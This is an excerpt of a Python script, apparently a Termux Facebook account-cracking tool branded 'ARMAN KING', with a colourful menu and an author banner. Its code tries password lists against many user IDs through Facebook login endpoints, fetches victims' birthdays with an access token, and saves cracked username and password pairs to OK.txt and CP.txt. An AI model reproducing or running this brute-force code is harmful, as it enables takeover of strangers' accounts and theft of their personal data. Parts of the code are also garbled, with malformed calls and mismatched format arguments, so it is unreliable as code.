...
def readline___Public_Xml():
	...
	print ('[🎌]=================================[🎌]')
	print ("")
	print("   [\033[1;31mH\033[1;32m] Start Cracking👿  ")
	print("   [\033[1;31mE\033[1;32m] Create Supper File [Not working]")
	print("   [\033[1;31mR\033[1;32m] Feedback")
	print("   [\033[1;31mO\033[1;32m] YouTube ")
	print ("   [\033[1;31mN\033[1;32m] Login Other Token")
	print ("")
	print ('[🎌]=================================[🎌]')
	key = input("       [+] Input : ")
	print ('    =================================')
	if key in [""]:
		...
		exit()
	elif key in ["1", "01","h","H"]:
		time.sleep(0.5)
		__crack__().plerr()
	elif key in ["2", "02","e","E"]:
		time.sleep(0.5)
		os.system('python Dump.py')
	elif key in ["3", "03","r","R"]:
		time.sleep(0.5)
		dupcutter()
	elif key in ["4", "04","o","O"]:
		time.sleep(0.5)
		sep()
	elif key in ["5", "05","n","N"]:
		time.sleep(0.5)
		login()
	elif key in ["0", "00" ,]:
		time.sleep(0.5)
...
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		...
		#KING_ARMAN ('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
	else:
...
class __crack__:
	...
	def plerr(self):
		try:
			...
			print (' [*]=============================================')
			self.id = KING(self.apk).read().splitlines()
			KING_ARMAN (' [*] Total ID : %s'%(len(self.id)))
		...
		if _jokowi_kontol_ in ('M', 'm'):
				...
				if pwek == '':
					...
					def _sempak_(bse=None):
						...
						if boy == '':
							...
							KING_ARMAN ('[•] Result CP saved to CP.txt')
							KING_ARMAN ('\n\tCrack Processing...\n')
							KING_ARMAN ('\n\tCrack Processing...\n\n');logo()
							...
							exit()
					KING_ARMAN ('\n01.) Metode b-api ')
					KING_ARMAN ('02.) Metode mbasic ')
					KING_ARMAN ('03.) Metode Mobile ')
					_sempak_(pwek.split(','))
					break
			...
			KING_ARMAN ('\n\t------[ Method Crack ]-----')
			print (' [*]=============================================')
			KING_ARMAN (' [1] ARMAN  Method 1 ')
			KING_ARMAN (' [2] ARMAN  Method 2  [ Pro ]')
			KING_ARMAN (' [3] ARMAN  Method 3   ')
			print (' [*]=============================================')
			self.__pler__()
		else:
			exit()
	...
	def __api__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;97m [ARMAN ] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			try:
				ua_xiaomi = KING('agent.txt', 'r').read()
			...
			if "access_token" in p:
				KING_ARMAN ('\r\033[1;92m[Successful-ARMAN ] %s | %s%s      '%(user,pw,tahun(user)))
				...
				try:
					token = KING('login.txt').read()
					cp_ttl = Prof_Imtiaz('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month]
					KING_ARMAN ('\r\033[1;91m[Checkpoint-ARMAN ] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
					...
					pass
				KING_ARMAN ('\r\033[1;91m[Checkpoint-ARMAN ] %s | %s%s      '%(user,pw,tahun(user)))
				wrt = '%s - %s%s' % (user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				KING_ARMAN ('\r\033[1;32m[Successful-ARMAN ] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					token = KING('token.txt').read()
					cp_ttl = Prof_IMtiaz('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month].KING_ARMAN ('\r\033[1;91m[Checkpoint-ARMAN ] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('CP.txt','a').write('%s\n' % wrt)
					break
	...
	def __mfb__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				KING_ARMAN ('\r\033[1;92m[Successful-ARMAN ] %s | %s      '%(user,pw))
				wrt = '%s - %s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
...
banner=("""
\033[1;32m┌────────────────────────────────────────────────┐
\033[1;3m│\033[1;31m➣\033[1;37m AUTHOR  \033[1;31m:\033[1;32m ARMAN KING    
\033[1;32m│\033[1;31m➣\033[1;37m FACEBOOK\033[1;31m:\033[1;32m  MD ARMAN HOSSAIN  
\033[1;32m│\033[1;31m➣\033[1;37m WHATSAPP\033[1;31m:\033[1;32m +88013188058**
\033[1;32m│\033[1;31m➣\033[1;37m YOUTUBE \033[1;31m:\033[1;32m no channel   
\033[1;32m└────────────────────────────────────────────────┘
\033[1;32m★彡[ᴛʀᴍᴜx ᴄᴏᴍᴍᴀɴᴅ ɢʀᴏᴜᴘ ᴄ.ᴇ.ᴏ ᴋɪɴɢ ᴀʀᴍᴀɴ]彡★              
\033[41m\033[1;37m👅[👿👿]   [ARMAN]      [ARMAN]   [👿👿]👅\x1b[0m
\033[1;32m┌───────────────────────────────────────┐
\033[1;33m│ [➥] AUTHOR   :  ARMAN\033[1;32m[99]             │
\033[1;34m│ [➥] GITHUB   :  \033[1;32marmang3          │
\033[1;35m│ [➥] WHATSAPP :  013188058**           │
\033[1;36m│ [➥] POWER    :  \033[1;31mMD ARMAN KING               \033[1;32m│
\033[1;37m└───────────────────────────────────────┘""")
ct = datetime.now()
n = ct.month
...
def dupcutter():
	os.system("xdg-open https://wa.me/+88013188058**")
	time.sleep(3)
	readline___Public_Xml()
def sep():
	logo()
